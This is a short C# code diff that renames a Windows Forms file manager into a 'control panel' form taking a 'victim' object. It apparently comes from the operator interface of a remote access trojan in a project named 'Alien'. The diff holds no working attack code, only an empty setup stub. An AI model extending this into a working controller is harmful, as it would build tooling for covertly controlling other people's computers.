@@ -10,21 +10,25 @@ using System.Windows.Forms;
 
 namespace Alien
 {
-    public partial class frmFileMgr : Form
+    public partial class frmControlPanel : Form
     {
-        public frmFileMgr()
+        private clsVictim m_victim { get; set; }
+
+        public frmControlPanel(clsVictim victim)
         {
             InitializeComponent();
+
+            m_victim = victim;
         }
 
-        void setup()
+        void fnSetup()
         {
 
         }
 
-        private void frmFileMgr_Load(object sender, EventArgs e)
+        private void frmControlPanel_Load(object sender, EventArgs e)
         {
-            setup();
+            fnSetup();
         }
     }
 }
